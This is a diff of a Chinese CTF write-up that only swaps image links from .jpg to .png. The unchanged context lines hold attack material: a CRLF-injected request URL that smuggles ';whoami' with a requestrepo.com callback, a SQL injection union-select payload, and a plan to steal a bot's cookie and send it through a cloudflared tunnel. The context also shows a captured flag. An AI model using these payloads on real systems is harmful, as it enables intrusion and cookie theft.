@@ -147,9 +147,9 @@ if(isset($_GET['secret'])){
 http://156.238.233.93/categories/test%20HTTP/1.1%0d%0aHost:%20156.238.233.93%0d%0a%0d%0aGET%20/categories.php%3fsecret=4fz7yove.requestrepo.com;whoami
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
-![image](./assets/002.jpg)
+![image](./assets/002.png)
 
 复现完之后思路就很清晰了，只需要加个http头即可
 
@@ -264,7 +264,7 @@ if __name__ == "__main__":
 
 稍微看了一下代码，核心逻辑还是越权，但是这个代码逻辑的判断是有问题的
 
-![image](./assets/003.jpg)
+![image](./assets/003.png)
 
 `getData`直接return了，查询的时候又写个and，`dbPassword = getData(username + "_password")`这里得知怎么查询`admin`的密码
 
@@ -295,7 +295,7 @@ famous_person=flag_7392ilj8i32
 https://cooking.chal.cyberjousting.com/search?recipe_name=&description=&tags=' ) union select 1,2,3,4 from user--+
 ```
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 判断出来是八列之后，不然列名为`int`，我们挨个换就好了
 
@@ -516,7 +516,7 @@ module.exports = { visitUrl };
 
 其中会对我们的url直接进行访问，并且还会带有Cookie，而且我直接尝试输入`https://4fz7yove.requestrepo.com/`发现确实能够收到请求
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 ```js
 // server.js
@@ -672,7 +672,7 @@ server.listen(port, () => {
 </html>
 ```
 
-收到了，但是并不是正确的Cookie，说明思路是对的，就是劫持websocket的会话，让他去访问得到flag，再带出来，后面疑问，发现怎么打都打不出来，结果一问![image](./assets/006.jpg)
+收到了，但是并不是正确的Cookie，说明思路是对的，就是劫持websocket的会话，让他去访问得到flag，再带出来，后面疑问，发现怎么打都打不出来，结果一问![image](./assets/006.png)
 
 昨天测试，我发现我的HK服务器，以及很多东西都会被waf，只能收到DNSLOG，不能收到http请求，所以为了解决这个问题，我打算利用CF来起一个隧道
 
@@ -691,7 +691,7 @@ cloudflared --version
 
 需要登录一下`cloudflared login`，由于我只有两个域名，博客的域名开了CF会更卡，所以用的`rb3.top`，再开启通道即可`cloudflared tunnel --url http://localhost:80`
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 ```html
 <!DOCTYPE html>
@@ -719,7 +719,7 @@ cloudflared --version
 
 现在改成9999端口准备收Cookie，`cloudflared tunnel --url http://localhost:9999`，注意这个html要放在github pages上面，不然也不能成功
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 不过这样产生的域名很长，我们可以使用自己的域名
 
@@ -756,7 +756,7 @@ DNS请求日志，首先我们要知道哪些是DNS请求，通常DNS请求使�
 grep -E ",53," logs.txt | awk -F, '{for(i=1;i<=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $(i+2)=="53") print $i}' | sort | uniq -c | sort -nr
 ```
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
 交这个最多的就是对了
 
@@ -779,7 +779,7 @@ grep -E ',(3333|4444|5555|7777|8888|9999|14433|14444|45560|45700|16060),' logfil
 > }' | sort | uniq -c | sort -nr | head -10
 ```
 
-![image](./assets/010.jpg)
+![image](./assets/010.png)
 
 直接冲了`byuctf{172.16.0.10,172.16.0.5}`
 
